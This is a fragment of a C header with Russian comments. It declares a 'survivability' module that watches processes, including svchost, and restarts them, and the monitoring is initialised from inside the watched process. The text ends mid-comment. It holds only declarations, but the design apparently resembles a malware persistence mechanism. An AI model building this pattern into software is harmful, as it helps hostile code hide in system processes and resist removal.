//----------------------------------------------------------------------------
//  Модуль живучести
//  Следит за необходимыми процессами и перезапускает их при необходимости
//----------------------------------------------------------------------------


#ifndef KeepAliveH
#define KeepAliveH

//----------------------------------------------------------------------------


// системы за которыми может следить модуль живучести

#define PROCESS_SVCHOST  1 /* Следить за процессом svchost*/


//---------------------------------------------------------------------
//  Функция инициализирует систему слежения внутри требуемого
//  процесса. Вызывается из процесса за которым будет вестись
//  наблюдение
//---------------------------------------------------------------------
bool KeepAliveInitializeProcess(DWORD ProcessNomber);


//---------------------------------------------------------------------
//  Функция запускает поток слежения за жизнью указанного процесса
